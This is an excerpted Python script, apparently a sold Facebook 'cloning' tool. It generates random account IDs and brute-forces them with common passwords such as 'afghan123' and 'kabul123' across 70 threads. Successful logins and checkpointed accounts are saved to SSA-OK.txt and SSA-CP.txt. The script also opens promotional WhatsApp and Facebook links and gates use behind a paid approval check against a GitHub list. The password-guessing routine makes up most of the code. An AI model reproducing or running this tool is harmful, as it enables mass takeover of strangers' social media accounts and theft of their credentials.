...
os.system('xdg-open https://www.facebook.com/profile.php?id=100090106382690')
...
import uuid
import os,sys,time,json,random,re,string,platform,base64
os.system('xdg-open https://chat.whatsapp.com/JwGXIzbUhBB70gUKQM56xc')
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
...
\033[1;31m│\033[1;37m [+]  \033[1;32m[ᴀᴜᴛʜᴏʀ]\033[1;31m  ➟  \033[1;32mATAL KING        \033[1;31m       │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ꜰᴀᴄᴇʙᴏᴏᴋ]\033[1;31m➟  \033[1;32mATAL KING         \033[1;31m      │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ɢɪᴛʜᴜʙ]\033[1;31m  ➟ \033[1;32m R1B-2-0                  \033[1;31m        │
\033[1;31m│\033[1;37m [+]  \033[1;32m[ʏᴏᴜᴛᴜʙᴇ]\033[1;31m ➟  \033[1;32mATAL KING                  \033[1;31m        │
...
cps = []
try:
    print('\n You must have good fast internet\n\033[1;37m Brothers, wait for the system to activate\033[0;97m\n You will not regret using this command, please go ahead ')
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='2':
		os.system('xdg-open https://chat.whatsapp.com/JwGXIzbUhBB70gUKQM56xc?text=SSA💜🐰Sir😪💕')
	if riaz1 =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100090106382690');riaz()
	else:
...
def annu():
    os.system('clear')
    print(logo)
    print('[1] RANDOM CLONING  \x1b[1;32m1')
...
def m1():
    ...
    os.system('clear')
    print(logo)
    print('[+] Example  : 2000,3000,5000,Etc')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        print("\033[1;37m \x1b[1;93mUse flight mode for 5 seconds\033[1;37m")
        lines()
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghanistan','Afghan12345','۱۲۳۴۵۶','khankhan']
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'afghan123','afghanistan','kabul123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
        ...
        for ps in pwx:
          ...
          'user-agent': pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SSA-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SSA-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SSA-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SSA-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mSSA\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/SAKING101/Khalid1/blob/main/Approve.txt').text
    if id in httpCaht:
      ...
      print("\33[1;32mNOTE:")
      print("\33[1;37m----------------------------------------------")
      print("\33[1;32mFor 15 Days Approval Price 200 AFG")
      print("\33[1;32mFOR 1 MONTH PRICE 400 AFG       ")
      print('\033[1;37mFREE USER DONT COME IB  ')
      print('\33[1;37m----------------------------------------------')
      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
      input('IF U WANT TO BUY THHEN PRESS ENTER ')
      tks = ('Hello%20khalid%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+93703711950?text='+tks),approval()
      time.sleep(1)
      approval()
  except:
    sys.exit()
